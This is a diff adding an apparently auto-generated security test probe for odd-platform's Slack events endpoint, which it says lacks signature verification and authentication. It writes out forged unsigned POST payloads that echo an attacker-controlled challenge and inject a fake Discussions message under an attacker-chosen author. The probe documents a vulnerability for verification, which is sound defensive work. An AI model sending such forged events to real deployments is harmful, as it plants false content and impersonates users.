@@ -1,0 +1,164 @@
+---
+probe_id: P-140
+emitted_by: file-analyser
+emitted_in_sidecar: odd-platform__java__EventApiController__controller-class__EventApiController
+emitted_at: 2026-05-25T00:00:00Z
+status: pending-stress-protocol
+feature_id: null
+test_class: security
+verified_against_commit: 4ec2b20
+maintainer_curated: false
+stack_profile: odd-minimal
+expected_outcome: |
+  Stress question (Category D + name-behavior pair + Category F available-but-unused):
+  EventApiController declares `@PostMapping("/api/slack/events")` and the live docs
+  (https://docs.opendatadiscovery.org/configuration-and-deployment/odd-platform#enable-data-collaboration)
+  instruct operators to point their Slack app's event-subscription request_url at
+  this endpoint. Slack's documented contract for event receivers (https://api.slack.com/authentication/verifying-requests-from-slack)
+  requires the receiver to validate the `X-Slack-Signature` HMAC-SHA256 header
+  (computed over `v0:{X-Slack-Request-Timestamp}:{raw body}` using the app
+  signing-secret). The codebase contains ZERO matches across `<odd-platform>`
+  for `X-Slack-Signature`, `signing.secret`, `signingSecret`, `verifySignature`,
+  `HMAC.SHA256`, `slack.*verify`, or `verifySlack` (verified by grep at
+  commit 4ec2b20). The controller method signature is
+  `handleSlackEvent(@RequestBody final Mono<String> rawRequestBody)` — no
+  `@RequestHeader`, no `ServerWebExchange` parameter. The path
+  `/api/slack/events` is explicitly listed in `WHITELIST_PATHS` (SecurityConstants.java:96)
+  and `permittedPaths` (LoginFormSecurityConfiguration.java:50) so it bypasses
+  authentication in all four auth modes.
+
+  Hypothesis: a forged POST from any internet host with a Slack-shaped JSON
+  body is (a) accepted with HTTP 200, (b) for type=url_verification echoes
+  back the attacker-controlled `challenge` value verbatim, (c) for type=event_callback
+  with a `message` event whose thread_ts matches an existing tracked
+  `message.provider_message_id` row is enqueued into `message_provider_event`
+  and later materialises into a child `message` row whose text is
+  attacker-controlled. No HTTP 401, no HTTP 403, no signature-related error.
+
+  Operator-visible consequence: forged Discussions-tab entries appear on
+  data-entity overview pages, attributed to an attacker-chosen "user" string
+  (the `event.user` field is copied to `message.provider_message_author` in
+  DataCollaborationMessageEventProcessor / SlackMessageProviderEventHandler.payloadForCreate
+  line 49).
+---
+arrange:
+  - kind: docker-compose-up
+    note: |
+      odd-minimal stack with datacollaboration.enabled=true and a non-empty
+      datacollaboration.slack-oauth-token (any non-empty string suffices for
+      the boot-time IllegalArgumentException guard — the test only exercises
+      the inbound path, no outbound Slack call is made).
+  - kind: env
+    DATACOLLABORATION_ENABLED: "true"
+    DATACOLLABORATION_SLACK_OAUTH_TOKEN: "xoxb-test-token-not-real"
+    AUTH_TYPE: "DISABLED"
+  - kind: sql
+    description: "Seed a tracked parent message that the forged event can target."
+    query: |
+      -- assume data_entity id=1 already exists in the seed; if not, INSERT one
+      INSERT INTO message (
+        uuid, parent_message_uuid, data_entity_id, text, created_at, sent_at,
+        state, provider, provider_channel_id, provider_channel_name,
+        provider_message_id, owner_id
+      ) VALUES (
+        '11111111-1111-1111-1111-111111111111', NULL, 1, 'tracked parent',
+        NOW() AT TIME ZONE 'utc', NOW() AT TIME ZONE 'utc',
+        2 /* SENT */, 'SLACK', 'C0PROBE140', 'probe-channel-140',
+        '1700000000.000100', NULL
+      );
+
+act:
+  - kind: rest
+    description: "Forged URL-verification challenge from an arbitrary internet caller."
+    method: POST
+    path: /api/slack/events
+    headers:
+      Content-Type: "application/json"
+      # No X-Slack-Signature header on purpose
+    body: |
+      {"type": "url_verification", "challenge": "PROBE-CHALLENGE-ATTACKER-CONTROLLED"}
+    capture_as: challenge_response
+
+  - kind: rest
+    description: "Forged thread-reply message_event targeting the seeded parent."
+    method: POST
+    path: /api/slack/events
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "type": "event_callback",
+        "event_id": "Ev1PROBE140",
+        "event_time": 1700000000,
+        "event": {
+          "type": "message",
+          "user": "U_PROBE_ATTACKER",
+          "text": "FORGED-DISCUSSIONS-ENTRY-FROM-PROBE-140",
+          "ts": "1700000001.000200",
+          "thread_ts": "1700000000.000100",
+          "channel": "C0PROBE140"
+        }
+      }
+    capture_as: payload_response
+
+observe:
+  - kind: sql
+    description: "Wait up to 30s for the processor to materialise the event into a child message row."
+    query: |
+      SELECT count(*) AS forged_msg_count
+        FROM message
+       WHERE provider_message_id = '1700000001.000200'
+         AND provider = 'SLACK'
+         AND text = 'FORGED-DISCUSSIONS-ENTRY-FROM-PROBE-140'
+         AND provider_message_author = 'U_PROBE_ATTACKER'
+    capture_as: forged_msg_count
+    poll_for_seconds: 30
+
+  - kind: sql
+    description: "Count of inbound event rows the parser/service accepted."
+    query: |
+      SELECT count(*) AS event_row_count
+        FROM message_provider_event
+       WHERE event->>'event_id' = 'Ev1PROBE140'
+          OR event->>'ts' = '1700000001.000200'
+    capture_as: event_row_count
+
+assert:
+  - "challenge_response.status == 200"
+  - "challenge_response.body.challenge == 'PROBE-CHALLENGE-ATTACKER-CONTROLLED'  # endpoint echoes attacker-controlled value unauthenticated"
+  - "payload_response.status == 200  # unsigned forged event accepted"
+  - "event_row_count.row[0].event_row_count == 1  # forged event persisted"
+  - "forged_msg_count.row[0].forged_msg_count == 1  # forged message materialised into Discussions tab"
+
+cleanup:
+  - kind: sql
+    query: |
+      DELETE FROM message_provider_event WHERE event->>'ts' = '1700000001.000200';
+      DELETE FROM message WHERE provider_message_id IN ('1700000000.000100', '1700000001.000200');
+  - kind: docker-compose-down
+    destroy_volumes: true
+
+cross_references:
+  related_sidecars:
+    - odd-platform__java__EventApiController__controller-class__EventApiController
+    - odd-platform__java__DataCollaborationController__controller-method__postMessageInSlack
+  retrospectives: []
+
+realism_caveats: |
+  The probe pins the missing-signature-verification hypothesis directly. The
+  three assertions discriminate clearly:
+    - challenge echo = the controller has no concept of caller identity and
+      blindly trusts the request body shape; a forged caller can use ODD as
+      a reflective oracle for the `/api/slack/events` path.
+    - payload accepted = no auth gate, no signature check, no rate limit.
+    - forged_msg materialised = end-to-end the forgery surfaces in a real
+      user-facing Discussions-tab entry attributed to an attacker-chosen user.
+  The probe DOES NOT verify what happens when Slack's signature IS present —
+  that's not the hypothesis (we already know from grep that there's no code
+  to read it). The probe also does NOT verify the cross-data-entity blast
+  radius (the seeded parent message is on data_entity_id=1; an attacker
+  needs to know a tracked thread_ts but the probe demonstrates that knowing
+  a single thread_ts is sufficient to inject content). For production
+  workspaces connected to public Slack channels, thread_ts values are
+  observable to anyone in the channel — making the gap exploitable in
+  practice, not just in theory.
